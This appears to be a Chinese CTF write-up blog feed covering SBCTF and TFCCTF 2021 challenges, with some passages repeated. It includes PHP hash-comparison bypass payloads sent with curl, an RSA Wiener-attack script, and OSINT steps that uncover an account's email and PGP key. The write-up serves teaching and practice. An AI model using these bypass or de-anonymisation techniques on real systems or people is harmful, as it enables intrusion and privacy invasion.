(https://docs.google.com/spreadsheets/d/1iBRs347v5xXICdgHm4-sQBEFozbqhTABPIespxSBI20).Can you help me find it? Note: Please submit the flag like this example: -----BEGIN PGP PUBLIC KEY BLOCK----- Version: ProtonMail aBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB BBBBYz -----END PGP PUBLIC KEY BLOCK----- Flag: SBCTF{aBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBYz} 访问题目中给出的Google表格的链接. 然后访问https://docs.google.com/spreadsheets/u/0/查看最近访问的表格文件,并用F12抓包 找到Gmail邮箱priv4te3mail0fmr.8@gmail.com 题目要求我们找到ProtonMail账号的PGP公钥,猜测邮箱前缀可能一样,即priv4te3mail0fmr.8@protonmail.com 参照https://protonmail.com/support/knowledge-base/download-public-private-key/,下载PGP公钥 ~$ wget https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com --2021-12-08 10:43:59-- https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com 正在解析主机 api.protonmail.ch (api.protonmail.ch)... 185.70.42.25 正在连接 api.protonmail.ch (api.protonmail.ch)|185.70.42.25|:443... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：709 [application/pgp-keys] 正在保存至: “lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com” lookup?op=get&amp;search=priv4te3mail0fmr 100%[========================================================================&gt;] 709 --.-KB/s 用时 0s 2021-12-08 10:44:00 (225 MB/s) - 已保存 “lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com” [709/709]) ~$ cat lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com -----BEGIN PGP PUBLIC KEY BLOCK----- Version: ProtonMail xjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoU bjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8 cHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJh lwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRS LQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/ AS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrO OARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs 8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRS LQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV 8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8= =E+gi -----END PGP PUBLIC KEY BLOCK----- flag:SBCTF&#123;xjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoUbjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8cHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJhlwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/AS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrOOARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8==E+gi&#125; Tricks 1A couple of PHP Tricks, give it a try. &lt;?php error_reporting(0); if (isset($_GET[&quot;a&quot;]) &amp;&amp; isset($_GET[&quot;b&quot;])) &#123; if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; sha1($_GET[&quot;a&quot;]) === sha1($_GET[&quot;b&quot;])) &#123; if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; md5($_GET[&quot;a&quot;]) === md5($_GET[&quot;b&quot;])) &#123; $flag = file_get_contents(&quot;../../flag&quot;); echo $flag; &#125;else &#123; echo &quot;Didn&#39;t get passed MD5.&quot;; &#125; &#125;else &#123; echo &quot;Didn&#39;t get passed SHA1.&quot;; &#125; &#125;else &#123; highlight_file(__FILE__); die(); &#125; ?&gt; md5和sha1 不能用来处理数组,md5(arr)和sha1(arr)会返回null payload: a[]=a&amp;b[]=b ~$ curl &quot;https://ch5.sbug.se/?a[]=a&amp;b[]=b&quot; SBCTF&#123;g07_2_w17h_0n3_SH07?&#125; flag:SBCTF&#123;g07_2_w17h_0n3_SH07?&#125; Tricks 2Another round of PHP Tricks, good luck. &lt;?php error_reporting(0); if (isset($_GET[&#39;a&#39;]) &amp;&amp; isset($_GET[&#39;b&#39;])) &#123; if ( strlen($_GET[&#39;a&#39;]) &gt; mb_strlen($_GET[&#39;b&#39;], base64_decode(&#39;dXRmOA==&#39;) )) &#123; if (strlen($_GET[&#39;b&#39;]) &gt; mb_strlen($_GET[&#39;a&#39;], base64_decode(&#39;dXRmOA==&#39;))) &#123; $u327a6c4304ad5938 = file_get_contents(base64_decode(&#39;Li4vLi4vZmxhZw==&#39;)); echo $u327a6c4304ad5938; &#125; else &#123; echo base64_decode(&#39;QWxyaWdodC4=&#39;); &#125; &#125; else &#123; echo base64_decode(&#39;VHJ5IGhhcmRlci4=&#39;); &#125; &#125; else &#123; highlight_file(__FILE__); die(); &#125; ?&gt; strlen返回的是字符串的字节数，而不是其中字符的数量. mb-strlen 用来获取字符串的长度,多字节的字符被计为1. 因此这里用多字节字符作为参数即可 payload: a=大&amp;b=大 $ curl &quot;https://ch6.sbug.se/?a=大&amp;b=大&quot; SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125; flag:SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;","summary":"Shingeki no RSAOne encryption, three params, you know what to do. https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing 题目给了一个out.txt,里面包含n,e,c的值 使用rsa-wiener-attack破解得到d的值 ~$ python RSAwienerHacker.py Hacked! 50954488565980029757584514143249292352586758895690937600871123296191815851393 代码: from Crypto.Util.number import long_to_bytes import gmpy2 e = 573539981054118375159951884901136205381955275096471242113613923667834312363548126598981740314307696033323138227176735824259098674326069670063001503892366653022633390483272968412233602239104757299239510751275655288670147128536527296060843927282827574422039154045360669647002461865276005609405093376965933104257 n = 666012509503758414438426745752029036046328310944346357068259451859585174290580664150188141697939659811599336002592599704089746160399428670863696780761420173279676565150259812749267725206078003773597631925996185977321417456827136083352043009732414371490356153874019687554196902819696964658218055292422529903061 c = 208271638964220806986932660131544686073844142913497222151993342727885811478884727510239109595118929917803309949401762080874858518281133929171859315997601484068462684780596513932104673255797873067799046024798017005908221308124294210078684387266545107254593378287958436606968619452939117043031695740389528821956 d = 50954488565980029757584514143249292352586758895690937600871123296191815851393 m = gmpy2.powmod(c, d, n) print(long_to_bytes(m)) flag:SBCTF&#123;d1d_y0u_us3_w13n3r&#39;s?&#125; Happy FlagWe have many flags. But we need a good flag! https://drive.google.com/file/d/1194sBi8Ijb4C-cYDGP2qZvXgj9uxSe7R/view?usp=sharing 题目给了一个文件world_flags.zeep,file后发现是一个zip压缩文件,使用unzip解压. 解压后发现有 ~$ file world_flags.zeep world_flags.zeep: Zip archive data, at least v1.0 to extract ~$ unzip world_flags.zeep Archive: world_flags.zeep creating: world_flags/ inflating: world_flags/1.txt inflating: world_flags/10.txt inflating: world_flags/100.txt inflating: world_flags/1000.txt inflating: world_flags/10000.txt inflating: world_flags/10001.txt .... 直接cat所有文件,然后用uniq去重 ~$ cat *.txt | uniq SBGTF&#123;false_flag_🥺&#125; SBCTF&#123;Cool_flag_!!!&#125; flag:SBCTF&#123;Cool_flag_!!!&#125; Query The FlagQuery the flag https://drive.google.com/file/d/1pwr09e-BoNoJujrJJ_hlAuhEGgJnsb6V/view?usp=sharing 题目给了一个SQLite的数据库文件,直接grep ~$ strings find.db | grep SBCTF SBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125;NULL flag:SBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125; they all look the sameThey are slightly different https://drive.google.com/file/d/1XjkSCEjydggD7FHaWsBxKYTrivyesd1M/view?usp=sharing 解压下载的zip文件,发现里面一堆jpg文件,首先看看md5值 ~$ md5 * MD5 (images - Copy (1).jpg) = b69410fdc3f11fbac6bb3e32e40df1de MD5 (images - Copy (10).jpg) = 1aa6e81b2335fdee91492125d4352503 MD5 (images - Copy (100).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 MD5 (images - Copy (101).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 MD5 (images - Copy (102).jpg) = 592434721909e841870ba0cfc0bce6aa MD5 (images - Copy (103).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 MD5 (images - Copy (104).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 MD5 (images - Copy (105).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 然后用exiftool查看文件的元数据试试 ~$ exiftool images\\ -\\ Copy\\ \\(1\\).jpg ExifTool Version Number : 12.31 File Name : images - Copy (1).jpg Directory : . File Size : 16 KiB File Modification Date/Time : 2021:11:21 00:21:28+08:00 File Access Date/Time : 2021:12:10 09:32:26+08:00 File Inode Change Date/Time : 2021:12:10 09:32:26+08:00 File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Resolution Unit : inches X Resolution : 96 Y Resolution : 96 Exif Byte Order : Big-endian (Motorola, MM) Image Description : S XP Title : S Padding : (Binary data 2060 bytes, use -b option to extract) About : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b Title : S Description : S Image Width : 376 Image Height : 134 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 376x134 Megapixels : 0.050 发现Image Description里有一个S,顺序打印一下所有文件的Image Description试试 ~$ for i in `seq 1 153`;do exiftool images\\ -\\ Copy\\ \\($&#123;i&#125;\\).jpg| grep &quot;Image Description&quot;;done Image Description : S Image Description : B Image Description : C Image Description : T Image Description : F Image Description : &#123; Image Description : H Image Description : 0 Image Description : w .... ~$ cat tmp | awk &#39;&#123;print $4&#125;&#39; | xargs echo S B C T F &#123; H 0 w _ c 0 u l d _ y 0 u _ d ! s t ! n g u ! s h S _ S S S ! S S S m S S S @ S S S g S S S 3 S S S s S S S _ S S S 结尾似乎有一些多余的S,去掉后即可得到flag flag:SBCTF&#123;H0w_c0uld_y0u_d!st!ngu!sh_!m@g3s_&#125; DiscordFind the account creation date of one of our discord channel admins (4dam). Note: Please put the date in this format YYYY&#x2F;MM&#x2F;DD for submission, like this: SBCTF{1970&#x2F;01&#x2F;01} 题目要求我们找到管理员4dam创建账号的时间. 首先打开Discord-&gt;:gear:-&gt;高级设置,打开“开发者模式” 对着头像右键,复制ID(808684903301775360) 打开https://snowsta.mp,输入ID查询 flag:SBCTF&#123;2020/02/09&#125; Email HuntI want to find the PGP Public Key of someone’s ProtonMail account, but all I got is a useless document he shared with me (https://docs.google.com/spreadsheets/d/1iBRs347v5xXICdgHm4-sQBEFozbqhTABPIespxSBI20).Can you help me find it? Note: Please submit the flag like this example: -----BEGIN PGP PUBLIC KEY BLOCK----- Version: ProtonMail aBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB BBBBYz -----END PGP PUBLIC KEY BLOCK----- Flag: SBCTF{aBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBYz} 访问题目中给出的Google表格的链接. 然后访问https://docs.google.com/spreadsheets/u/0/查看最近访问的表格文件,并用F12抓包 找到Gmail邮箱priv4te3mail0fmr.8@gmail.com 题目要求我们找到ProtonMail账号的PGP公钥,猜测邮箱前缀可能一样,即priv4te3mail0fmr.8@protonmail.com 参照https://protonmail.com/support/knowledge-base/download-public-private-key/,下载PGP公钥 ~$ wget https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com --2021-12-08 10:43:59-- https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com 正在解析主机 api.protonmail.ch (api.protonmail.ch)... 185.70.42.25 正在连接 api.protonmail.ch (api.protonmail.ch)|185.70.42.25|:443... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：709 [application/pgp-keys] 正在保存至: “lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com” lookup?op=get&amp;search=priv4te3mail0fmr 100%[========================================================================&gt;] 709 --.-KB/s 用时 0s 2021-12-08 10:44:00 (225 MB/s) - 已保存 “lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com” [709/709]) ~$ cat lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com -----BEGIN PGP PUBLIC KEY BLOCK----- Version: ProtonMail xjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoU bjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8 cHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJh lwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRS LQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/ AS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrO OARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs 8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRS LQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV 8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8= =E+gi -----END PGP PUBLIC KEY BLOCK----- flag:SBCTF&#123;xjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoUbjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8cHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJhlwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/AS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrOOARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8==E+gi&#125; Tricks 1A couple of PHP Tricks, give it a try. &lt;?php error_reporting(0); if (isset($_GET[&quot;a&quot;]) &amp;&amp; isset($_GET[&quot;b&quot;])) &#123; if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; sha1($_GET[&quot;a&quot;]) === sha1($_GET[&quot;b&quot;])) &#123; if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; md5($_GET[&quot;a&quot;]) === md5($_GET[&quot;b&quot;])) &#123; $flag = file_get_contents(&quot;../../flag&quot;); echo $flag; &#125;else &#123; echo &quot;Didn&#39;t get passed MD5.&quot;; &#125; &#125;else &#123; echo &quot;Didn&#39;t get passed SHA1.&quot;; &#125; &#125;else &#123; highlight_file(__FILE__); die(); &#125; ?&gt; md5和sha1 不能用来处理数组,md5(arr)和sha1(arr)会返回null payload: a[]=a&amp;b[]=b ~$ curl &quot;https://ch5.sbug.se/?a[]=a&amp;b[]=b&quot; SBCTF&#123;g07_2_w17h_0n3_SH07?&#125; flag:SBCTF&#123;g07_2_w17h_0n3_SH07?&#125; Tricks 2Another round of PHP Tricks, good luck. &lt;?php error_reporting(0); if (isset($_GET[&#39;a&#39;]) &amp;&amp; isset($_GET[&#39;b&#39;])) &#123; if ( strlen($_GET[&#39;a&#39;]) &gt; mb_strlen($_GET[&#39;b&#39;], base64_decode(&#39;dXRmOA==&#39;) )) &#123; if (strlen($_GET[&#39;b&#39;]) &gt; mb_strlen($_GET[&#39;a&#39;], base64_decode(&#39;dXRmOA==&#39;))) &#123; $u327a6c4304ad5938 = file_get_contents(base64_decode(&#39;Li4vLi4vZmxhZw==&#39;)); echo $u327a6c4304ad5938; &#125; else &#123; echo base64_decode(&#39;QWxyaWdodC4=&#39;); &#125; &#125; else &#123; echo base64_decode(&#39;VHJ5IGhhcmRlci4=&#39;); &#125; &#125; else &#123; highlight_file(__FILE__); die(); &#125; ?&gt; strlen返回的是字符串的字节数，而不是其中字符的数量. mb-strlen 用来获取字符串的长度,多字节的字符被计为1. 因此这里用多字节字符作为参数即可 payload: a=大&amp;b=大 $ curl &quot;https://ch6.sbug.se/?a=大&amp;b=大&quot; SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125; flag:SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;","date_published":"2021-11-29T07:05:35.000Z","tags":[]},{"id":"https://zhaoqi.vip/posts/501486646/","url":"https://zhaoqi.vip/posts/501486646/","title":"TFCCTF2021 Writeup","content_html":"<h1 id=\"SEA-LANGUAGE-1\"><a href=\"#SEA-LANGUAGE-1\" class=\"headerlink\" title=\"SEA LANGUAGE 1\"></a>SEA LANGUAGE 1</h1><p><em>Quick! Help! We are sinking!</em></p>\n<p><em>Wrap the result in TFCCTF{}</em></p>\n<hr>\n<p>看着像摩斯码,直接在<a href=\"https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0gLS4tLi0tIC4uLS0uLgo\">gchq.github.io</a>上解密</p>\n<p><img data-src=\"/../../CTF/TFCCTF2021/Crypto/images/image-20211202204916391.png\" alt=\"image-20211202204916391\"></p>\n<p><strong>flag:</strong><code>TFCCTF&#123;WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?&#125;</code></p>\n<h1 id=\"SEA-LANGUAGE-2\"><a href=\"#SEA-LANGUAGE-2\" class=\"headerlink\" title=\"SEA LANGUAGE? 2\"></a>SEA LANGUAGE? 2</h1><p><em>That’s just another way to……</em></p>\n<hr>\n<p>题目给的数据8个字符为一组,猜测可能是二进制,在<a href=\"https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'.'%7D,'0',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'_'%7D,'1',true,false,true,false)From_Binary('Space',8)&input=Ll8uXy5fLi4gLl8uLi5fXy4gLl8uLi4uX18gLl8uLi4uX18gLl8uXy5fLi4gLl8uLi5fXy4gLl9fX18uX18gLl9fXy5fX18gLi5fXy5fLi4KIC4uX18uLi5fIC4uX18uX19fIC5fLl9fX19fIC4uX18uXy4uIC5fLl9fX19fIC5fXy5fXy5fIC4uX18uLi5fIC5fXy5fX18uIC5fX18uXy5fCiAuLl9fLl9fXyAuLl9fLi5fXyAuLl8uX19fLiAuLl8uX19fLiAuLl8uX19fLiAuXy5fX19fXyAuLl9fLl9fXyAuX18uXy4uLiAuLl9fLi4uXwogLi5fXy5fLl8gLl8uX19fX18gLi5fXy4uLl8gLl9fXy4uX18gLl8uX19fX18gLl9fLl9fXy4gLi5fXy4uLi4gLi5fXy5fX18gLl8uX19fX18KIC5fXy5fXy5fIC4uX18uLi4uIC5fX18uLl8uIC5fX18uLl9fIC4uX18uLl9fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fCiAuLl8uLi4uXyAuX19fLi5fLiAuLl9fLi4uXyAuX18uLl9fXyAuX18uXy4uLiAuLl9fLl9fXyAuLl9fX19fXyAuX19fX18uXwo\">gchq.github.io</a>将<code>.</code>替换为<code>0</code>,<code>_</code>替换为<code>1</code>,然后二进制转字符串</p>\n<p><img data-src=\"/../../CTF/TFCCTF2021/Crypto/images/image-20211202205304755.png\" alt=\"image-20211202205739848\"></p>\n<p><strong>flag:</strong><code>TFCCTF&#123;w417_4_m1nu73..._7h15_1s_n07_m0rs3!!!!!r1gh7?&#125;</code></p>\n<h1 id=\"AAAAA\"><a href=\"#AAAAA\" class=\"headerlink\" title=\"AAAAA\"></a>AAAAA</h1><p><em>AAAAA. That’s all</em></p>\n<hr>\n<p>首先用<code>exiftool</code>分析,提示文件前2000个字节都是A</p>\n<pre><code class=\"shell\">~$ exiftool AAAAA\nExifTool Version Number         : 12.31\nFile Name                       : AAAAA\nDirectory                       : .\nFile Size                       : 157 KiB\nFile Modification Date/Time     : 2021:11:27 00:33:54+08:00\nFile Access Date/Time           : 2021:11:27 00:35:25+08:00\nFile Inode Change Date/Time     : 2021:11:27 00:34:19+08:00\nFile Permissions                : -rw-r--r--\nError                           : First 2000 bytes of file is ASCII &#39;A&#39; characters\n</code></pre>\n<p><code>hexdump -C AAAAA   </code>发现文件末尾的字节也有很多A,并且文件应该是一张PNG格式的图片</p>\n<pre><code class=\"shell\">~$ hexdump -C AAAAA | head\n00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\n*\n000007d0  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|\n000007e0  00 00 07 62 00 00 05 89  08 02 00 00 00 23 47 40  |...b.........#G@|\n000007f0  3c 00 00 00 09 70 48 59  73 00 00 2e 23 00 00 2e  |&lt;....pHYs...#...|\n00000800  23 01 78 a5 3f 76 00 02  65 2b 49 44 41 54 78 9c  |#.x.?v..e+IDATx.|\n00000810  ec bd 67 7b 1a cb da b4  dd 83 10 39 83 50 b6 bd  |..g&#123;.......9.P..|\n00000820  c2 de ff ff df dc ef 5e  6b d9 96 ad 48 ce 39 cc  |.......^k...H.9.|\n00000830  fb a1 9e a9 e3 12 b2 bd  1c 24 10 50 e7 07 1d 08  |.........$.P....|\n00000840  21 18 26 f4 74 57 57 d7  e5 f9 be ef 84 10 42 08  |!.&amp;.tWW.......B.|\n\n~$ hexdump -C AAAAA | tail  \n00026cf0  00 00 88 26 13 03 00 00  00 00 44 93 89 01 00 00  |...&amp;......D.....|\n00026d00  00 00 a2 c9 c4 00 00 00  00 00 d1 64 62 00 00 00  |...........db...|\n00026d10  00 80 68 32 31 00 00 00  00 40 34 99 18 00 00 00  |..h21....@4.....|\n00026d20  00 20 9a 4c 0c 00 00 00  00 10 4d 26 06 00 00 00  |. .L......M&amp;....|\n00026d30  00 88 f6 7f 00 7a e5 96  20 a3 a9 bd a4 00 00 00  |.....z.. .......|\n00026d40  00 49 45 4e 44 ae 42 60  82 41 41 41 41 41 41 41  |.IEND.B`.AAAAAAA|\n00026d50  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\n*\n00027510  41 41 41 41 41 41 41 41  41                       |AAAAAAAAA|\n00027519\n</code></pre>\n<p>去除文件首位的<code>A</code>即可,代码:</p>\n<pre><code class=\"python\">from pathlib import  Path\np = Path(&#39;AAAAA&#39;)\ndata = p.read_bytes()\ndata = data.strip(b&#39;A&#39;)\nPath(&#39;a.png&#39;).write_bytes(data)\n</code></pre>\n<p><img data-src=\"/../../CTF/TFCCTF2021/Forensics/images/AAAAA.png\" alt=\"AAAAA.png\"></p>\n<p><strong>flag:</strong><code>TFCCTF&#123;Gr4phic_d35ign_is_my_p455ion&#125;</code></p>\n<h1 id=\"DISCORD-SHENANIGANS\"><a href=\"#DISCORD-SHENANIGANS\" class=\"headerlink\" title=\"DISCORD SHENANIGANS\"></a>DISCORD SHENANIGANS</h1><p><em>We considered giving you a free flag. However, we decided against it. In general, we would never do that! Or would we? That’s the beginning of a good CTF! Discord is the new Twitter.</em></p>\n<p><em>To be able to solve this challenge, you’ll need to join our discord. Link in the Rules page.</em></p>\n<hr>\n<p>翻阅比赛官方的Discord,发现<code>#general</code>频道有一条特别奇怪的消息</p>\n<p><img data-src=\"/../../CTF/TFCCTF2021/Misc/images/image-20211203203451799.png\" alt=\"image-20211203203451799\"></p>\n<p>使用<a href=\"https://holloway.nz/steg/\">Twitter Secret Messages</a>解密即可</p>\n<p><img data-src=\"/../../CTF/TFCCTF2021/Misc/images/image-20211202215347694.png\" alt=\"image-20211202215347694\"></p>\n<p><strong>flag:</strong><code>TFCCTF&#123;th1s_5t3g0_fl4g_w45_n0t_h1dden_w3ll&#125;</code></p>\n<h1 id=\"PRETTY-GOOD-PHISHER\"><a href=\"#PRETTY-GOOD-PHISHER\" class=\"headerlink\" title=\"PRETTY GOOD PHISHER\"></a>PRETTY GOOD PHISHER</h1><p><em>This phisher thinks he’s the game! We got his PGP Key ID from his phishing e-mail, and we know for sure that he has another PGP key publicized under his real name! Can you find out more about him?</em></p>\n<p><em>A2DCB36111E3656B</em></p>\n<hr>\n<p>题目给了一个人的PGP密钥ID,要求我们找到他另一个以真名公开的PGP密钥</p>\n<p>在<a href=\"https://keyserver.pgp.com/vkd/SubmitSearch.event?SearchCriteria=A2DCB36111E3656B&EmailOrName=3&SearchType=0\">https://keyserver.pgp.com/</a>上检索,得到邮箱<code>tdgd11fd8@gmail.com</code></p>\n<p><img data-src=\"/../../CTF/TFCCTF2021/Misc/images/image-20211203195242066.png\" alt=\"image-20211203195242066\"></p>\n<p>在<a href=\"https://tools.epieos.com/email.php\">OSINT Tool</a>上搜索该邮箱,得到用户名是<code>Theobald Dannie Gyles</code></p>\n<img data-src=\"../../CTF/TFCCTF2021/Misc/images/image-20211203200112827.png\" alt=\"image-20211203200112827\" style=\"zoom:50%;\" />\n\n<p>在<a href=\"https://keyserver.pgp.com/vkd/SubmitSearch.event\">https://keyserver.pgp.com/</a>上搜索包含该用户名的PGP密钥,即可得到flag</p>\n<p><img data-src=\"/../../CTF/TFCCTF2021/Misc/images/image-20211203201556442.png\" alt=\"image-20211203201556442\"></p>\n<p><strong>flag:</strong><code>TFCCTF&#123;Pee,G...Pee!_w4s_wh4t_th4t_h3_t0ld_m3....!&#125;) </code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"SEA LANGUAGE 1Quick! Help! We are sinking! Wrap the result in TFCCTF{} 看着像摩斯码,直接在gchq.github.io上解密 flag:TFCCTF&#123;WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?&#125; SEA LANGUAGE? 2That’s just another way to…… 题目给的数据8个字符为一组,猜测可能是二进制,在gchq.github.io将.替换为0,_替换为1,然后二进制转字符串 flag:TFCCTF&#123;w417_4_m1nu73..._7h15_1s_n07_m0rs3!!!!!r1gh7?&#125; AAAAAAAAAA. That’s all 首先用exiftool分析,提示文件前2000个字节都是A ~$ exiftool AAAAA ExifTool Version Number : 12.31 File Name : AAAAA Directory : . File Size : 157 KiB File Modification Date/Time : 2021:11:27 00:33:54+08:00 File Access Date/Time : 2021:11:27 00:35:25+08:00 File Inode Change Date/Time : 2021:11:27 00:34:19+08:00 File Permissions : -rw-r--r-- Error : First 2000 bytes of file is ASCII &#39;A&#39; characters hexdump -C AAAAA 发现文件末尾的字节也有很多A,并且文件应该是一张PNG格式的图片 ~$ hexdump -C AAAAA | head 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 |AAAAAAAAAAAAAAAA| * 000007d0 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 |.PNG........IHDR| 000007e0 00 00 07 62 00 00 05 89 08 02 00 00 00 23 47 40 |...b.........#G@| 000007f0 3c 00 00 00 09 70 48 59 73 00 00 2e 23 00 00 2e |&lt;....pHYs...#...| 00000800 23 01 78 a5 3f 76 00 02 65 2b 49 44 41 54 78 9c |#.x.?v..e+IDATx.| 00000810 ec bd 67 7b 1a cb da b4 dd 83 10 39 83 50 b6 bd |..g&#123;.......9.P..| 00000820 c2 de ff ff df dc ef 5e 6b d9 96 ad 48 ce 39 cc |.......^k...H.9.| 00000830 fb a1 9e a9 e3 12 b2 bd 1c 24 10 